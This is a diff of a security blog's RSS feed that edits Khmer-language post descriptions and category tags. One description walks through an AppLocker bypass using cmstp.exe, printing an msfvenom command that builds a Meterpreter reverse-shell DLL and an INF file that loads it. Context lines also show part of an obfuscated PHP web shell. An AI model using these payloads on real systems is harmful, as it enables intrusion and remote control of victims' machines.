@@ -27,10 +27,10 @@
         <author>thiklab@gmail.com (Thik)</author>
         <atom:modified>Wed, 04 Aug 2021 02:00:06 +0700</atom:modified>
         <guid>https://thiklab.com/posts/applocker-bypass-cmstp/</guid>
-        <description>ឯកសារ CMSTP ត្រូវរបានក្សាទុកនៅក្នុងប្រអប់ឯកសារនៃប្រព័ន្ធប្រតិត្តិការវិនដូ៖
-1 2  C:\Windows\System32\cmstp.exe C:\Windows\SysWOW64\cmstp.exe   វីធីសាស្ត្រមួយនេះត្រូវបានរកឃើញដោយលោក Oddvar Moe សូមអានលំអិតនៅក្នុង blog របស់គាត់។
+        <description>ឯកសារ CMSTP ត្រូវបានរក្សាទុកនៅក្នុងថតឯកសារនៃវិនដូ៖
+1 2  C:\Windows\System32\cmstp.exe C:\Windows\SysWOW64\cmstp.exe   វីធីសាស្ត្រមួយនេះត្រូវបានរកឃើញដោយលោក Oddvar Moe អាចអានលំអិតនៅក្នុង blog របស់គាត់។
 DLL Metasploit ត្រូវបានប្រើប្រាស់ដើម្បីបង្កើតឯកសារមេរោគ DLL តាមរយៈ MSFvenom ។
-1  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll &amp;gt; idm.dll   សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងរបស់ឯកសារ DLL ដែល​បាន​បង្កើត​រួចខាង​លើ។
+1  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll &amp;gt; idm.dll   សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងរបស់ឯកសារ DLL ដែល​បាន​បង្កើត​រួច។
 1 2 3 4 5 6 7 8 9 10 11 12 13 14  [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] C:\Users\Victim\idm.dll  [Strings] AppAct = &amp;#34;SOFTWARE\Microsoft\Connection Manager&amp;#34; ServiceName=&amp;#34;idm&amp;#34; ShortSvcName=&amp;#34;idm&amp;#34;   រក្សាទុកជា &amp;ldquo;idm-service.</description>
         
         <dc:creator>thik</dc:creator>
@@ -136,7 +136,11 @@ Get Reverse Shell Go back to metasploit and get the shell.</description>
             
           
             
-              <category>msf</category>
+              <category>metasploit</category>
+            
+          
+            
+              <category>reverseshell</category>
             
           
         
@@ -277,10 +281,16 @@ On the receiving end running,</description>
         
         
         
+          
+            
+              <category>netcat</category>
+            
+          
+        
         
           
             
-              <category>Netcat</category>
+              <category>Tools</category>
             
           
         
@@ -336,7 +346,7 @@ USh3ll-IV 1  &amp;lt;?=$a=&amp;#34;sy&amp;#34;;$b=&amp;#34;stem&amp;#34;;$c=$a.$
         
           
             
-              <category>php</category>
+              <category>phpshell</category>
             
           
         
